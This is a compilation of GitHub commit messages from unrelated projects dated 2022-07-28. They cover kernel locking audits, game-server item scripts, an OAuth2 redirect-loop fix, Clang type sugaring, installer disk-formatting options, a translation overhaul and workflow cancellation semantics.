$ bitbake -c testsdk meta-ide-support

This runs the same toolchain tests from meta/lib/oeqa/sdk/cases as the regular
sdk testing does.

Signed-off-by: Alexander Kanavin <alex@linutronix.de>
Signed-off-by: Alexandre Belloni <alexandre.belloni@bootlin.com>

---
## [Atom-X-Devs/android_kernel_xiaomi_sm7325](https://github.com/Atom-X-Devs/android_kernel_xiaomi_sm7325)@[6fbde41217...](https://github.com/Atom-X-Devs/android_kernel_xiaomi_sm7325/commit/6fbde41217d5974e825fb80bb8fc0a3746564a4b)
#### Thursday 2022-07-28 11:55:13 by Daniel Vetter

dma_resv: prime lockdep annotations

Full audit of everyone:

- i915, radeon, amdgpu should be clean per their maintainers.

- vram helpers should be fine, they don't do command submission, so
  really no business holding struct_mutex while doing copy_*_user. But
  I haven't checked them all.

- panfrost seems to dma_resv_lock only in panfrost_job_push, which
  looks clean.

- v3d holds dma_resv locks in the tail of its v3d_submit_cl_ioctl(),
  copying from/to userspace happens all in v3d_lookup_bos which is
  outside of the critical section.

- vmwgfx has a bunch of ioctls that do their own copy_*_user:
  - vmw_execbuf_process: First this does some copies in
    vmw_execbuf_cmdbuf() and also in the vmw_execbuf_process() itself.
    Then comes the usual ttm reserve/validate sequence, then actual
    submission/fencing, then unreserving, and finally some more
    copy_to_user in vmw_execbuf_copy_fence_user. Glossing over tons of
    details, but looks all safe.
  - vmw_fence_event_ioctl: No ttm_reserve/dma_resv_lock anywhere to be
    seen, seems to only create a fence and copy it out.
  - a pile of smaller ioctl in vmwgfx_ioctl.c, no reservations to be
    found there.
  Summary: vmwgfx seems to be fine too.

- virtio: There's virtio_gpu_execbuffer_ioctl, which does all the
  copying from userspace before even looking up objects through their
  handles, so safe. Plus the getparam/getcaps ioctl, also both safe.

- qxl only has qxl_execbuffer_ioctl, which calls into
  qxl_process_single_command. There's a lovely comment before the
  __copy_from_user_inatomic that the slowpath should be copied from
  i915, but I guess that never happened. Try not to be unlucky and get
  your CS data evicted between when it's written and the kernel tries
  to read it. The only other copy_from_user is for relocs, but those
  are done before qxl_release_reserve_list(), which seems to be the
  only thing reserving buffers (in the ttm/dma_resv sense) in that
  code. So looks safe.

- A debugfs file in nouveau_debugfs_pstate_set() and the usif ioctl in
  usif_ioctl() look safe. nouveau_gem_ioctl_pushbuf() otoh breaks this
  everywhere and needs to be fixed up.

v2: Thomas pointed at that vmwgfx calls dma_resv_init while it holds a
dma_resv lock of a different object already. Christian mentioned that
ttm core does this too for ghost objects. intel-gfx-ci highlighted
that i915 has similar issues.

Unfortunately we can't do this in the usual module init functions,
because kernel threads don't have an ->mm - we have to wait around for
some user thread to do this.

Solution is to spawn a worker (but only once). It's horrible, but it
works.

v3: We can allocate mm! (Chris). Horrible worker hack out, clean
initcall solution in.

v4: Annotate with __init (Rob Herring)

Cc: Rob Herring <robh@kernel.org>
Cc: Alex Deucher <alexander.deucher@amd.com>
Cc: Christian König <christian.koenig@amd.com>
Cc: Chris Wilson <chris@chris-wilson.co.uk>
Cc: Thomas Zimmermann <tzimmermann@suse.de>
Cc: Rob Herring <robh@kernel.org>
Cc: Tomeu Vizoso <tomeu.vizoso@collabora.com>
Cc: Eric Anholt <eric@anholt.net>
Cc: Dave Airlie <airlied@redhat.com>
Cc: Gerd Hoffmann <kraxel@redhat.com>
Cc: Ben Skeggs <bskeggs@redhat.com>
Cc: "VMware Graphics" <linux-graphics-maintainer@vmware.com>
Cc: Thomas Hellstrom <thellstrom@vmware.com>
Reviewed-by: Thomas Hellstrom <thellstrom@vmware.com>
Reviewed-by: Christian König <christian.koenig@amd.com>
Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk>
Tested-by: Chris Wilson <chris@chris-wilson.co.uk>
Signed-off-by: Daniel Vetter <daniel.vetter@intel.com>
Link: https://patchwork.freedesktop.org/patch/msgid/20191104173801.2972-1-daniel.vetter@ffwll.ch
Signed-off-by: Divyanshu-Modi <divyan.m05@gmail.com>

---
## [neuromancerxi/server](https://github.com/neuromancerxi/server)@[ccf500070d...](https://github.com/neuromancerxi/server/commit/ccf500070d4448d1e2acbdb711190d5b4e21c4e6)
#### Thursday 2022-07-28 13:43:14 by neuromancerxi

Add scripts and adjust plumbing for many temp items (#670)

* Add scripts and adjust plumbing for many temp items

Adds Scripts for items.
Adds Effect scripts for X_BOOST_II
Updates Effect scripts for the following:

ACCURACY_BOOST
ATTACK_BOOST
INTENSION
MAGIC_SHIELD
MULTI_STRIKES
MULTI_SHOTS
PAX
PHYSICAL_SHIELD
POTENCY
RAMPART

Adjusts item_usable use times to 1s.

Notes on effects:

Ascetics Tonic/Gambir - +25/+50 MATT/MACC
A big Thank You to Nyu for confirming the Intension effect for MACC.
https://www.bg-wiki.com/bg/Ascetic's_Tonic
https://www.bg-wiki.com/bg/Ascetic's_Gambir

Bravers Drink - +15 to All Stats
https://www.bg-wiki.com/bg/Braver's%20Drink
Reference to Icons/Effects - https://youtu.be/JYT5a_pTA3o?t=20

Champions Tonic - +15 Haste / +3 Crit rate
Champions Drink/Gambir - +18 Haste / +5% Crit rate
Expected Haste effect to be Magic pool based on BG comment (18 and 15)
Critical Hit rate, no data available from community sources, conservative value of 5 (Drink/Gambir) 3 (Tonic)
Both BG and 'clopedia sources confirm Critical Hit Rate (as does the effect description), however, only BG has a reference to Haste value.
https://www.bg-wiki.com/bg/Champion's_Tonic

Gnostics Drink - Enmity -10
No community resources confirm this value, using SCH Animus Minuo as an reference.
https://www.bg-wiki.com/bg/Gnostic's%20Drink
https://www.bg-wiki.com/bg/Animus_Minuo

Monarchs Drink - Regain +3 (30/1000 per tick) for 3 minutes.
https://www.bg-wiki.com/bg/Monarch's_Drink

Stalwart's Tonic/Gambir - ACC/RACC 50/100 ATTP/RATTP 25/50
A big Thank You to Nyu for confirming the effects apply ACC/RACC and ATTP/RATTP across two effects.
https://www.bg-wiki.com/bg/Stalwart's_Tonic
https://www.bg-wiki.com/bg/Stalwart's_Gambir

Berserker's Tonic/Drink - DA 50/100
Thanks to Nyu for confirming the MULTI_STRIKES effect and 1m duration.
https://ffxiclopedia.fandom.com/wiki/Berserker%27s_Drink
No full data on DA rate, minus 'clopedia which has verification tags. Working on the expectation that this follows a good portion of the other items and follows the half potency values for the lesser item.

Swiftshot Tonic/Drink - Double Shot 50/100
https://www.ffxiah.com/forum/topic/28603/fools-tonic-broken#1749569

Dusty Scroll of Reraise - Reraise III, 10m duration.
https://www.bg-wiki.com/bg/Dusty_Reraise

Spiritual Incense/Fools Drink/Tonic/Powder: See effects/magic_shield
Carnal Incense/Fanatics Drink/Tonic/Powder: See effects/physical_shield

* Removed copypasta subp and trailing whitespace.

* Item script clean-up and move effect functions to item_utils.

* Resolve Conflicts

Convert namespace in scripts from item_utils to xi.item_utils
PHYS_ABSORB to Percent from 10000 Scale

---
## [treckstar/yolo-octo-hipster](https://github.com/treckstar/yolo-octo-hipster)@[cd2bfdbdf0...](https://github.com/treckstar/yolo-octo-hipster/commit/cd2bfdbdf0c4c09a8bb68d0a7c33c3dde42007a0)
#### Thursday 2022-07-28 14:22:03 by treckstar

Life is one big road with lots of signs. So when you riding through the ruts, don't complicate your mind. Flee from hate, mischief and jealousy. Don't bury your thoughts, put your vision to reality. Wake Up and Live!

---
## [Foundation-19/Foundation-19](https://github.com/Foundation-19/Foundation-19)@[ea904cd81f...](https://github.com/Foundation-19/Foundation-19/commit/ea904cd81f16d6feb161b0dbd24eca7524df15ab)
#### Thursday 2022-07-28 14:33:00 by Calyxman

Makes Crisis robot actually worth using. (#576)

* Adds adrenaline to paramedic borg hypospray

Kinda weird how the robot whos meant to be doing paramedic shit doesnt have shit to restart the heart or apply allergic reaction first aid???
Adds /datum/reagent/medicine/adrenaline to the crisis borghypo.

* Adds ATK, ABK to Crisis Cyborg

Adds the advanced trauma and burn kits to the Crisis cyborg. This makes it a direct tradeoff between Crisis and Emergency Response flying. ER has more mobility, but worse gear for medical treatment, while the Crisis cyborg has less mobility but better gear.

* Adds tylenol and dexalin to crisis borg

Why tf does the surgical borg, specializing in surgical procedures, have better equipment for the medical doctor job than the actual medical cyborg?
Tradeoff between Emergency Response and Crisis: Crisis has lower mobility, but better gear, and Emergency Response has higher mobility but worse gear.

---
## [Poojawa/VOREStation-fork](https://github.com/Poojawa/VOREStation-fork)@[38724d4d4c...](https://github.com/Poojawa/VOREStation-fork/commit/38724d4d4c140fb4bfc92444ba3e5dd182ca7df9)
#### Thursday 2022-07-28 14:49:33 by VerySoft

[WIP] pAI tweaks and upgrades

Changes some things around! 

Removes the 'wipe' button from pAI's interface, since I think there being an instant 'kill player' button is pretty lame, especially since most pAIs activate on their own without a master. They're easy enough to kill or contain without this, so I don't see it as necessary. If you want to kill your pAI friend just eat them. :U

Removes the 'pAI Suicide' verb, and renames the 'Wipe Personality' to 'Enter Storage' and moved it from the OOC tab to the pAI Commands tab. Killing a pAI deletes the card and all that, where the 'Enter Storage' verb deletes the card and spawns a new one that can be used, which! I think it more appropriate.

Makes it so that, when damaged, pAIs will slowly regenerate while folded up, at a rate of 0.5 brute and burn per life tick, where previously it had been impossible to recover health outside of admin intervention.

Updated the Universal Translator with many of the newer languages that aren't obviously for events or hivemind type things.

Added the same emotes that humans can use to pAIs

Added an alternative pAI card style, and rearranged the expressions for the cards a little bit, and added one more.

Plan to add more pAI chassis to play with

---
## [ichi0915/gate](https://github.com/ichi0915/gate)@[e2a108db75...](https://github.com/ichi0915/gate/commit/e2a108db759f1cdfe89c8ac6bd3fafc10c39ac8e)
#### Thursday 2022-07-28 16:38:56 by Chris Phillips

fix(authn/oauth2): prevent oauth2 redirect loops (#1517)

During setup of spinnaker authentication with oauth2 a common hurdle is a redirect loop.

For example:

https://github.com/spinnaker/spinnaker/issues/5794
https://github.com/spinnaker/spinnaker/issues/1630

Also, many threads in Slack discuss these problems. In fact this appears to be a common
pitfall for the spring-security-oauth2-autoconfigure library in general. A light refresher
on the ouath2 flow in play here seems worthwhile. The user is redirected from `/login` in gate
to the external auth provider (google, github, etc.) and after successfully authenticating
they are redirected back to the gate `/login` endpoint but this time with a code parameter
that is to be used to request an access token.

This request can fail for a variety of reasons, and if it does, the underlying spring library
triggers a redirect to the `/error` endpoint. What causes the redirect loop for gate in particular
(and for other users of the library in a similar fashion) is that the WebSecurityConfigurerAdapter
in play is treating `/error` as an authenticated path and so instead of just returning with a 401,
it re-redirects to `/login` and the redirect loop continues.

My thought is that instead of a redirect loop, simply allowing the 401 to be returned will be a stronger
more helpful signal as to what is going on. Hopefully it will save future first-time installers headaches.

Spinnaker docs have included several troubleshooting hints and tips for how where you terminate SSL
affects configuration etc. Even after following all of these and lots of spelunking through spinnaker
github issues and combing over threads in slack, I found myself still experiencing a redirect loop even
though I had applied all the combined wisdom that was applicable to my setup.

As it turns out, I had a bad copy/paste of my client secret in my configuration. So the request
to turn the code from google into an access token from google was failing with a 401. After much
debugging and deep diving into the spring security code I found that had I turned on DEBUG in gate
for these classes in gate-local.yml:

```
logging:
  level:
    org.springframework.security.web.authentication.SimpleUrlAuthenticationFailureHandler: DEBUG
    org.springframework.security.oauth2.client.filter.OAuth2ClientAuthenticationProcessingFilter: DEBUG
```

Then I would have seen in the logs that a 401 response was returned from google and perhaps it would have
caused me to look closer at my botched client secret configuration. I think perhaps we don't want to require
that all operators of spinnaker become spring-security-oauth2 experts. So I'm proposing adding `/error` to
the list of paths in gate that aren't treated as authenticated. Thus short-circuiting the redirect loop and
bringing to light helpful troubleshooting info that was previously more or less swallowed.

---
## [tgockel/llvm-project](https://github.com/tgockel/llvm-project)@[15f3cd6bfc...](https://github.com/tgockel/llvm-project/commit/15f3cd6bfc670ba6106184a903eb04be059e5977)
#### Thursday 2022-07-28 16:55:58 by Matheus Izvekov

[clang] Implement ElaboratedType sugaring for types written bare

Without this patch, clang will not wrap in an ElaboratedType node types written
without a keyword and nested name qualifier, which goes against the intent that
we should produce an AST which retains enough details to recover how things are
written.

The lack of this sugar is incompatible with the intent of the type printer
default policy, which is to print types as written, but to fall back and print
them fully qualified when they are desugared.

An ElaboratedTypeLoc without keyword / NNS uses no storage by itself, but still
requires pointer alignment due to pre-existing bug in the TypeLoc buffer
handling.

---

Troubleshooting list to deal with any breakage seen with this patch:

1) The most likely effect one would see by this patch is a change in how
   a type is printed. The type printer will, by design and default,
   print types as written. There are customization options there, but
   not that many, and they mainly apply to how to print a type that we
   somehow failed to track how it was written. This patch fixes a
   problem where we failed to distinguish between a type
   that was written without any elaborated-type qualifiers,
   such as a 'struct'/'class' tags and name spacifiers such as 'std::',
   and one that has been stripped of any 'metadata' that identifies such,
   the so called canonical types.
   Example:
   ```
   namespace foo {
     struct A {};
     A a;
   };
   ```
   If one were to print the type of `foo::a`, prior to this patch, this
   would result in `foo::A`. This is how the type printer would have,
   by default, printed the canonical type of A as well.
   As soon as you add any name qualifiers to A, the type printer would
   suddenly start accurately printing the type as written. This patch
   will make it print it accurately even when written without
   qualifiers, so we will just print `A` for the initial example, as
   the user did not really write that `foo::` namespace qualifier.

2) This patch could expose a bug in some AST matcher. Matching types
   is harder to get right when there is sugar involved. For example,
   if you want to match a type against being a pointer to some type A,
   then you have to account for getting a type that is sugar for a
   pointer to A, or being a pointer to sugar to A, or both! Usually
   you would get the second part wrong, and this would work for a
   very simple test where you don't use any name qualifiers, but
   you would discover is broken when you do. The usual fix is to
   either use the matcher which strips sugar, which is annoying
   to use as for example if you match an N level pointer, you have
   to put N+1 such matchers in there, beginning to end and between
   all those levels. But in a lot of cases, if the property you want
   to match is present in the canonical type, it's easier and faster
   to just match on that... This goes with what is said in 1), if
   you want to match against the name of a type, and you want
   the name string to be something stable, perhaps matching on
   the name of the canonical type is the better choice.

3) This patch could expose a bug in how you get the source range of some
   TypeLoc. For some reason, a lot of code is using getLocalSourceRange(),
   which only looks at the given TypeLoc node. This patch introduces a new,
   and more common TypeLoc node which contains no source locations on itself.
   This is not an inovation here, and some other, more rare TypeLoc nodes could
   also have this property, but if you use getLocalSourceRange on them, it's not
   going to return any valid locations, because it doesn't have any. The right fix
   here is to always use getSourceRange() or getBeginLoc/getEndLoc which will dive
   into the inner TypeLoc to get the source range if it doesn't find it on the
   top level one. You can use getLocalSourceRange if you are really into
   micro-optimizations and you have some outside knowledge that the TypeLocs you are
   dealing with will always include some source location.

4) Exposed a bug somewhere in the use of the normal clang type class API, where you
   have some type, you want to see if that type is some particular kind, you try a
   `dyn_cast` such as `dyn_cast<TypedefType>` and that fails because now you have an
   ElaboratedType which has a TypeDefType inside of it, which is what you wanted to match.
   Again, like 2), this would usually have been tested poorly with some simple tests with
   no qualifications, and would have been broken had there been any other kind of type sugar,
   be it an ElaboratedType or a TemplateSpecializationType or a SubstTemplateParmType.
   The usual fix here is to use `getAs` instead of `dyn_cast`, which will look deeper
   into the type. Or use `getAsAdjusted` when dealing with TypeLocs.
   For some reason the API is inconsistent there and on TypeLocs getAs behaves like a dyn_cast.

5) It could be a bug in this patch perhaps.

Let me know if you need any help!

Signed-off-by: Matheus Izvekov <mizvekov@gmail.com>

Differential Revision: https://reviews.llvm.org/D112374

---
## [omertuc/assisted-service](https://github.com/omertuc/assisted-service)@[21cd101be1...](https://github.com/omertuc/assisted-service/commit/21cd101be1c712e21679f192226bec8c4a1285de)
#### Thursday 2022-07-28 19:50:53 by Omer Tuchfeld

MGMT-10542: Allow users to skip writing over specific disks - SaaS

# Background

After the assisted-installer writes the OCP operating system to the
host's installation disk and then asks the host to reboot, we can only
hope that the installation disk is the one that will boot next.

On BIOS-based systems, we have no way to control which disk gets booted
next. On UEFI-based systems, we try to change the boot order (via
`efibootmgr` which writes to the EFI NVRAM) to influence that our disk
gets booted next, but in general, one of the following three things could happen:

1) The discovery ISO media gets booted, again. This is bad, but we can
detect this and let the user know.

2) Some disk other than the installation disk gets booted. This is bad,
and there's nothing we can do about it. We can't even tell for sure if
that happened.

3) The installation disk boots and everything is fine and installation
/ cluster initialization proceeds as expected.

To avoid (2), the assisted-service, by default, when the user clicks
install, will ask the assisted-installer to attempt to format the boot
partition of some of the disks that the assisted-agent recognized as
"Bootable" (these are disks that when you run `file -s <blockdev>` on
them, it says that they have an MBR boot record).

By attempting to clear the boot sector of these hosts, we hope that BIOS
will no longer recognize these disks as bootable and so will not try to
automatically boot from them, thus preventing (2).

# The issue

ALL disks that we recognized as bootable (save for some special
exceptions) get formatted, all for the sake of ensuring the user won't
run into confusing boot order issues. This is an opinionated decision we
made to improve the ease of use of the Assisted Installer, but it comes
at a cost of destroying user disks, some of which could potentially be
important and might be used by the cluster / server hardware. Some users
may be unhappy with decision and may want to have more control.

On arm devices sometimes one of the disks is firmware sdcard that we
cause to lose all partitions and it requires painful re-imaging. This
request came up from customers multiple times Even though the concrete
example is for ARM, we would like to have this for all architectures

# The solution

Give users an abiltiy to opt out of formatting particular disk(s). When
users opt-in to using this feature, the UI will show them a warning
explaining that it is on them to ensure they won't run into any boot
order issues, and it's up to them to take care of it.

# Implementation

Two new API changes have been introduced -

* New read-only disks_to_be_formatted column added to every host,
  managed by the service. It's a comma separated list of disks that are
  automatically planned to undergo formatting once installation begins,
  unless otherwise set to be skipped by skip_formatting_disks. The
  reason this new API was added is because we would like the UI to gray
  out disks that are not potentially going to be formatted, but the UI
  doesn't know which disks are potentially going to formatted and which
  are not, as this is currently done using this rather nasty condition
  that looks something like: if disk.Bootable && !disk.Removable &&
  !isMmcblk && !isFcIscsi && !disk.IsInstallationMedia. We wouldn't want
  the UI to have to deal with all these messy details

* New user-updatable skip_formatting_disks column. Can be modified
  through a newly added host UPDATE method API. The new UPDATE API field
  will contain a list of disks, and for each disk, whether the user
  wants it removed from or added to the skip_formatting_disks list.

The new API will not allow the user to "skip formatting" disks that
do not appear in disks_to_be_formatted in the first place, as that
would be pointless.

When determining which disks the assisted-service should ask the
assisted-installer to format, the assisted-service will consult both
disks_to_be_formatted and skip_formatting_disks to decide on the final
list (the final list is a simple `set(disks_to_be_formatted)` minus `set(skip_formatting_disks)`)

# Thoughts about the installation disk

I have consciously decided that the installation disk, if it is
bootable, will appear in disks_to_be_formatted and can also be added byh
the user to `skip_formatting_disks`. This simplifies the implementation
dramatically as it avoids having to integrate the "installation disk
selection" flows (which are rather confusing) with the "skip disk
formatting" flows.

This comes at a cost - the UI would have to make it clear for the user,
that even though the user chose to skip the installation disk, since it
is currently the installation disk, it will anyway undergo the obvious
formatting a disk goes when an operating system is installed on it.

If we feel a warning is not enough, we can alternatively add a blocking
validation to the host that checks that the installation disk does not
appear in the `skip_formatting_disks` list. This validation would be the
simplest way to solve this issue without mixing the flows mentioned in
the first paragraph of this section

---
## [mezzio/mezzio](https://github.com/mezzio/mezzio)@[cb239a9a81...](https://github.com/mezzio/mezzio/commit/cb239a9a81c00394beee622f62261cd1980df847)
#### Thursday 2022-07-28 20:00:30 by Michał Bundyra

Message against the war, in Russian and English

> ## 🇷🇺 Русским гражданам
>
> Мы, участники Laminas, родились и живем в разных странах. У многих из нас есть друзья, родственники и коллеги как в России, так и в Украине. Некоторые из нас родились в России. Некоторые из нас живут в России. У некоторых бабушки и дедушки сражались с фашистами во Второй мировой войне. Здесь никто не поддерживает фашизм.
>
> У одного из нас есть украинская родственница, которая спаслась из дома вместе с сыном. Поезд задержался из-за бомбежки на дороге впереди. У нас есть друзья, которые прячутся в бомбоубежищах. Мы с тревогой ждем весточки от них после воздушных налетов, которые беспорядочно наносят удары и попадают по больницам, школам, детским садам и домам. Мы не берем это из каких-либо СМИ. Мы наблюдаем это напрямую.
>
> Вы доверяете нам достаточно, чтоб использовать наши программы, и мы просим вас довериться нам вновь. Мы нуждаемся в помощи. Выходите и протестуйте против этой бесполезной войны. Остановите кровопролитие. Скажите "Нет войне!"
>
> ## 🇺🇸 To Citizens of Russia
>
> We at Laminas come from all over the world. Many of us have friends, family and colleagues in both Russia and Ukraine. Some of us were born in Russia. Some of us currently live in Russia. Some have grandparents who fought Nazis in World War II. Nobody here supports fascism.
>
> One team member has a Ukrainian relative who fled her home with her son. The train was delayed due to bombing on the road ahead. We have friends who are hiding in bomb shelters. We anxiously follow up on them after the air raids, which indiscriminately fire at hospitals, schools, kindergartens and houses. Were not taking this from any media. These are our actual experiences.
>
> You trust us enough to use our software. We ask that you trust us to say the truth on this. We need your help. Go out and protest this unnecessary war. Stop the bloodshed. Say "stop the war!"

Signed-off-by: Michał Bundyra <contact@webimpress.com>

---
## [gitster/git](https://github.com/gitster/git)@[5beca49a0b...](https://github.com/gitster/git/commit/5beca49a0b1f3c6d05a4437ca037ab2123a2de57)
#### Thursday 2022-07-28 20:20:59 by Ævar Arnfjörð Bjarmason

test-lib: simplify by removing test_external

Remove the "test_external" function added in [1]. This arguably makes
the output of t9700-perl-git.sh and friends worse. But as we'll argue
below the trade-off is worth it, since "chaining" to another TAP
emitter in test-lib.sh is more trouble than it's worth.

The new output of t9700-perl-git.sh is now:

	$ ./t9700-perl-git.sh
	ok 1 - set up test repository
	ok 2 - use t9700/test.pl to test Git.pm
	# passed all 2 test(s)
	1..2

Whereas before this change it would be:

	$ ./t9700-perl-git.sh
	ok 1 - set up test repository
	# run 1: Perl API (perl /home/avar/g/git/t/t9700/test.pl)
	ok 2 - use Git;
	[... omitting tests 3..46 from t/t9700/test.pl ...]
	ok 47 - unquote escape sequences
	1..47
	# test_external test Perl API was ok
	# test_external_without_stderr test no stderr: Perl API was ok

At the time of its addition supporting "test_external" was easy, but
when test-lib.sh itself started to emit TAP in [2] we needed to make
everything surrounding the emission of the plan consider
"test_external". I added that support in [2] so that we could run:

	prove ./t9700-perl-git.sh :: -v

But since then in [3] the door has been closed on combining
$HARNESS_ACTIVE and -v, we'll now just die:

	$ prove ./t9700-perl-git.sh :: -v
	Bailout called.  Further testing stopped:  verbose mode forbidden under TAP harness; try --verbose-log
	FAILED--Further testing stopped: verbose mode forbidden under TAP harness; try --verbose-log

So the only use of this has been that *if* we had failure in one of
these tests we could e.g. in CI see which test failed based on the
test number. Now we'll need to look at the full verbose logs to get
that same information.

I think this trade-off is acceptable given the reduction in
complexity, and it brings these tests in line with other similar
tests, e.g. the reftable tests added in [4] will be condensed down to
just one test, which invokes the C helper:

	$ ./t0032-reftable-unittest.sh
	ok 1 - unittests
	# passed all 1 test(s)
	1..1

It would still be nice to have that ":: -v" form work again, it
never *really* worked, but even though we've had edge cases test
output screwing up the TAP it mostly worked between d998bd4ab67 and
[3], so we may have been overzealous in forbidding it outright.

I have local patches which I'm planning to submit sooner than later
that get us to that goal, and in a way that isn't buggy. In the
meantime getting rid of this special case makes hacking on this area
of test-lib.sh easier, as we'll do in subsequent commits.

The switch from "perl" to "$PERL_PATH" here is because "perl" is
defined as a shell function in the test suite, see a5bf824f3b4 (t:
prevent '-x' tracing from interfering with test helpers' stderr,
2018-02-25). On e.g. the OSX CI the "command perl"... will be part of
the emitted stderr.

1. fb32c410087 (t/test-lib.sh: add test_external and
   test_external_without_stderr, 2008-06-19)
2. d998bd4ab67 (test-lib: Make the test_external_* functions
   TAP-aware, 2010-06-24)
3. 614fe015212 (test-lib: bail out when "-v" used under
   "prove", 2016-10-22)
4. ef8a6c62687 (reftable: utility functions, 2021-10-07)

Signed-off-by: Ævar Arnfjörð Bjarmason <avarab@gmail.com>
Signed-off-by: Junio C Hamano <gitster@pobox.com>

---
## [a5tronomy/duckstation](https://github.com/a5tronomy/duckstation)@[f9212363d3...](https://github.com/a5tronomy/duckstation/commit/f9212363d3370efcdb97d4f7de010b5f17bd5c5e)
#### Thursday 2022-07-28 20:43:56 by IlDucci

Spanish translation overhaul + Addition of es-ES alternative

In its current state, the Spanish translations for Duckstation are a mess of different dialects, multiple translations for the same terms, mistranslations or excessively literal translations, and typos.

It's a shame, because you could feel that the initial translations were done with care, but were muddled with future revisions.

This commit tries to solve all of these and also change the initial decision of the first translator to have an "universal" "neutral" Spanish, as time has proven it's not possible without a dedicated translator who actually wants to have one Spanish language for all Spanish-speakers across the globe.

I'm not going to be that one, so the next option would be to duplicate the Spanish translations into two: one for the Spanish-speaking American people (called "Latin American Spanish", "español de Hispanoamérica", code es-419") and one for the European Spanish speakers (called "Spanish (Spain)", "español de España", code es-ES).

This distinction is used in multiple software applications that managed to have translators for different languages, and should also funnel any future Latin American Spanish and European Spanish translators to the corresponding file.

I have tried to follow as many existing terms and constructions as possible, restoring and/or rewording any phrasal constructions that were disunified by the multiple translators.

Since I have a limited experience with Latin American Spanish, this commit should be sent as a draft for additional revisions. I'm open to stick to having a single Spanish language, but it has to be done RIGHT.

This is an overview of changes across the board:
 - Added missing translations for QT and Android builds.
 - Unified translations between those.
 - Updated the QT file with the latest string values.
 - Massive removal of Title Uppercasing inherited from English in menu strings (the rules set by the Royal Academy of the Spanish Language, or RAE, limit the areas where Title Uppercasing is considered correct in Spanish. Menu names and window header texts are not within those areas).
 - Unified the treatment of users in the Latin American version to formal "ustedeo". This treatment could be modified with additional input.
 - Removed any gendering assumptions from any string directed towards the user (Are you sure...?, changed ¿Está/s seguro...? with ¿Seguro que...?)
 - Naturalization rewrites.
 - Typo corrections.
 - Gender corrections over definitive terms.
 - Adding missing NBSPs after required mathemathical characters or units.
 - Mass replacement of double/single quotes with angled quotes (the ones approved for Spanish).
 - Quoted non-Spanish, non-proper noun English words as dictated by RAE.
 - Removal of unwanted hyphens to join words (Auto-detectar with Detección automática, post-procesamiento with posprocesamiento). In Spanish, hyphens tend to separate, rather than join.
 - Revision of the compound forms, unified depending on Latin American Spanish or European Spanish.
 - Lowercased the first word of a text between parenthesis (Spanish rules dictate that they should be considered a continuation of the phrase, and thus, they should start with lowercase unless it's a proper noun or a word that must be uppercased) and corrected the positions between periods and parentheses.
 - Unified the accentuation rules for the adverb solo/sólo and the demostrative pronouns (este/ese/aquel) by removing all accents in European Spanish (following the RAE's 2010 suggestions) or keeping/adding them for Latin American Spanish (the 2010 rule ended up being a suggestion because while Spain has mostly deprecated those accents, it appears that the Latin American countries have not). To discuss?
 - Tweaked the key shortcuts for the QT menu to minimize duplicates.
 - Terms unified (this list doesn't represent the entirety of the changes):
    - Failed to (Fallo al/Error al): Fallo al
    - Hardcore Mode (Modo Hardcore/Modo Difícil): «hardcore» mode (Foreign non-proper nouns should be quoted, RetroAchievements does not have an official Spanish translation, so the term should be kept in English)
    - Enable/Disable (habilitado/deshabilitado/activado/desactivado/activo/inactivo): habilitado/deshabilitado
    - host (host/anfitrión/sistema): sistema, TO BE DETERMINED AND UNIFIED
    - Signed (numbers; firmados): (números) con signo
    - scan (verb and noun; escanear): buscar/búsqueda
    - Clear (something, like bindings or codes; despejar, limpiar): borrar/quitar
    - requirement (of a system, requisito/requerimento): requisito
    - input (of a controller, control): entrada
    - Threaded X (hilo de X): X multihilo
    - Frame Pacing (frame pacing): duración de fotogramas
    - XX-bit (XX-bit): XX bits (proper form)
    - Widescreen (screens, widescreen hacks; pantalla ancha, pantalla panorámica): pantalla panorámica
    - Antialiasing (anti-aliasing): Antialiasing (considered a proper noun by NVidia, doesn't need that hyphen)
    - hash: «hash» (could be discussed as "sumas de verificación", like on Dolphin)
    - Focus Loss (perder el foco): ir/entrar en segundo plano
    - toggle (verb for hotkeys, activar): alternar (as the key alternates between enabling and disabling the function, while "activate" might sound like it's just the enable part)
    - Rewind (function; retrocediendo, retrocedimiento): rebobinado (to discuss on LATAM Spanish)
    - shader (shader/sombreado): sombreador
    - resume (resumir): reanudar, continuar (resumir is a false friend)
    - Check (verb; chequear/revisar/comprobar): chequear (LATAM Spanish), comprobar (European Spanish)
    - Add (something; añadir/agregar): agregar (LATAM Spanish, to discuss) or añadir (European Spanish)
    - Enter/Input (ingrese, inserte): ingresar (LATAM Spanish) or introducir (European Spanish)
    - mouse (device; mouse/ratón): mouse (LATAM Spanish), ratón (European Spanish)
    - Auto-Detect (Auto-detectar): Detección automática
    - Controller (control): mando (for European Spanish only)
    - run (a game, the emulator; correr): ejecutar, funcionar (for European Spanish only)

---
## [abhishekj720/cadence](https://github.com/abhishekj720/cadence)@[add4b390ad...](https://github.com/abhishekj720/cadence/commit/add4b390ada43fdd8167f06e209ae6ece0d11aaa)
#### Thursday 2022-07-28 21:22:19 by Steven L

Standardizing cancellation behavior: a canceled workflow never starts a new run (#4898)

# Summary for busy people

Workflow cancellation was kinda weird and confusing, and left some awful, unrecoverable, and un-*preventable* edge cases (particularly with child workflows).  It also left users with no way to reliably stop work, aside from termination.  Termination is inherently "unclean" and risky, so it should not be required to achieve something outside exceptional circumstances where recovery is not possible.

This commit changes that: cancellation is now "sticky", and a canceled workflow does not ever trigger a new run after it completes, regardless of how it completes, so it can be used as a reliable "stop processing after cleanup" tool.  The final state of a canceled workflow's run is now *always* a successful completion with a value, canceled, or timed out. (termination remains always "terminated")  
A canceled workflow can still start and abandon child workflows, so all current behavior with retries / continue as new / etc can be replicated with child workflows if desired.

A fair bit of (not very complex) additional work here and in nearly all other repos is required to truly complete this, but it is *functional* and non-optional with this commit alone.  
In particular, adding a dynamic config to (temporarily!) restore old behavior should be fairly easy if it proves to be needed.

# More details and motivation

Part 1 of [many, tbd, in multiple repos] involved in changing workflow cancellation to reliably end workflows.
Tests will be coming soon, for now I'm using a fairly simple set of workflows and checking the resulting histories exhaustively by hand.

The primary motivation for these changes is to address some impossible-to-recover-from scenarios when canceling child workflows.  After further exploration and discussion we've realized that, without these changes, there is *no reliable way* to stop a sequence of workflows without relying on termination, which we consistently treat as a fallback / impure-but-necessary ultimate hammer.

Workflows should not *need* to rely on termination to achieve a desired behavior.  With these changes, cancellation becomes capable of *guaranteeing* that workflows end within some finite time, which is a unique ability and makes it much more consistent and reliable.  
Turning this into a "complete" change will require quite a few tests, documentation changes, client-side changes (to allow recording more info, and likely changing test suites), and some smallish database and maybe RPC changes (to hold/return more data in cancellation errors).

